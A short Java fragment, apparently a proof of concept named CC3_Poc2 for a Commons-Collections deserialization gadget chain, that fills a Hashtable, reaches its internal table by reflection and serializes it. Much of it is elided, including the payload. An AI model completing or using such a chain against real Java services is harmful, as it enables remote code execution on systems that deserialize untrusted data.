...
public class CC3_Poc2 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        ...
        Hashtable hashtableExp = new Hashtable();
        hashtableExp.put(1, 1);
        hashtableExp.put(2,2);
        hashtableExp.put(3, 3);


        Field tableField = hashtableExp.getClass().getDeclaredField("table");
        Permit.setAccessible(tableField);
        Object[] table = (Object[]) tableField.get(hashtableExp);
        int j = 0;
        ...
        outputStream.writeObject(hashtableExp);
        outputStream.close();
